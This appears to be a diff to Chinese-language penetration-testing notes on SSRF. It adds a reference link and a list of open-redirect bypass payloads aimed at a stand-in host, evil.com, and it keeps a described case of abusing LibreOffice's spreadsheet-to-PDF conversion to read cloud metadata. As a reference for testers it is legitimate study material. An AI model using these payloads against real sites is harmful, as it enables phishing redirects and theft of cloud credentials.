@@ -51,6 +51,7 @@
 - https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
 - [多个应用的盲SSRF](https://github.com/assetnote/blind-ssrf-chains)
 - [LibreOffice转换PDF导致的SSRF](https://r4id3n.medium.com/ssrf-exploitation-in-spreedsheet-to-pdf-converter-2c7eacdac781)
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
 
 
 
@@ -58,3 +59,42 @@
 - `<img src="http://127.0.0.1">`，发现并不能拿到127的内容，有安全机制；
 - `<img src=”http://myvps:1337”>`，vps接收到响应，根据UA得知是LibreOffice，
 - 利用上传xlsx的功能，在content.xml中注入payload，在转换成pdf过程中实现SSRF拿到敏感信息（[169.254.169.254]的metadata）
+
+
+
+### 常用payload
+```
+http://www.aaa.com?returnUrl=http://www.aaa.com.evil.com
+
+http://www.aaa.com?returnUrl=http://www.evil.com/www.aaa.com
+
+http://www.aaa.com?returnUrl=http://www.xxxaaa.com
+
+若再配合URL的各种特性符号，绕过姿势可是多种多样。比如
+
+利用问号?：
+
+http://www.aaa.com?returnUrl=http://www.evil.com?www.aaa.com
+
+利用反斜线\：
+
+http://www.aaa.com?returnUrl=http://www.evil.com\www.aaa.com
+
+http://www.aaa.com?returnUrl=http://www.evil.com\\www.aaa.com
+
+利用@符号：
+
+http://www.aaa.com?returnUrl=http://www.aaa.com@www.evil.com
+
+利用井号#：
+
+http://www.aaa.com?returnUrl=http://www.evil.com#www.aaa.com
+
+http://www.aaa.com?returnUrl=http://www.evil.com#www.aaa.com?www.aaa.com
+
+缺失协议：
+
+http://www.aaa.com?returnUrl=/www.evil.com
+
+http://www.aaa.com?returnUrl=//www.evil.com
+```
